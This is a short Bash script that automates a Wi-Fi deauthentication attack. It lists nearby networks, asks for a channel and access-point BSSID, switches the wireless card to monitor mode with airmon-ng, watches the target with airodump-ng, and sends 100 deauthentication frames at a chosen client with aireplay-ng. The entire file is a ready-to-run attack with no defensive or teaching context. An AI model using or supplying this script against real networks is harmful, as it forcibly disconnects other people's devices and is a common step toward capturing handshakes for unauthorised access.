nmcli device wifi list
read -p "Enter channel :" ch
read -p "Enter BSSID :" bssid

sudo airmon-ng  start wlan0
sudo iwconfig wlan0mon channel $ch
sudo airodump-ng --bssid $bssid -c $ch wlan0mon
read -p "Enter BSSID of target :" ch1
sudo aireplay-ng --deauth 100 -a $bssid -c $ch1  wlan0mon
sudo airmon-ng  stop wlan0mon

